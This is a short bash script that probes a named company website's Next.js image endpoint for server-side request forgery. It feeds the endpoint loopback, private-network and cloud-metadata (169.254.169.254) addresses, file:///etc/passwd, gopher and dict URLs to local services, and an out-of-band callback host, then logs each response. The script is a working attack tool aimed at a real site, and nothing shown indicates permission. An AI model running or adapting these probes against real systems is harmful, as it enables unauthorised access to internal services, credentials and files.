#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
cd "$WORK_PATH"
mkdir -p d11
probe() {
  local name="$1" url="$2" w="$3" q="$4"
  local e=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$url")
  local code=$(curl -s -A "$UA" -o d11/i_$name.bin -w "%{http_code}" --max-time 40 "$B/_next/image?url=$e&w=$w&q=$q")
  local sz=$(stat -c%s d11/i_$name.bin)
  local ct=$(file -b --mime-type d11/i_$name.bin)
  echo "[$name] $url w=$w q=$q -> $code size=$sz mime=$ct body=$(head -c 120 d11/i_$name.bin | tr -d '\0' | tr '\n' ' ')"
}
probe good "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg" 1080 75
probe loop "http://127.0.0.1:80/" 640 75
probe meta "http://169.254.169.254/latest/meta-data/" 640 75
probe localhost "http://localhost/" 640 75
probe priv10 "http://10.0.0.1/" 640 75
probe priv192 "http://192.168.0.1/" 640 75
probe self "https://www.infinitycapital.bh/_next/image?url=x" 640 75
probe fileurl "file:///etc/passwd" 640 75
probe gopher "gopher://127.0.0.1:25/" 640 75
probe dict "dict://127.0.0.1:11211/" 640 75
probe zerolen "http://0/" 640 75
probe oobimg "https://oobtest11111.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x.png" 640 75
